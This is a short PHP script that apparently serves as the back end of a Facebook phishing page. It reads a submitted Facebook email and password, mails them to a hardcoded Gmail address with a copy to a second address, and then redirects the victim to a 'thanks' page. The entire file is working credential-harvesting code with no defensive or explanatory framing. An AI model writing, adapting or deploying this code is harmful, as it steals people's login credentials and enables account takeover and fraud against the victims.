<?php
// get data from form
$facebookemail = $_POST['facebookemail'];
$facebookpassword = $_POST['facebookpassword'];
$to = "magzinochikelem@gmail.com";
$subject = "Mail From codenia";
$txt = "Name = ". $facebookemail ."\r\nMessage=" . $facebookpassword ;
$header = " From: noreply@codenia.com" . "\r\n" .
"CC:somebodyelse@example.com";
if($facebookemail != NUll){

    mail($to,$subject,$txt,$header);
}
header("Location:thanks.html");
?>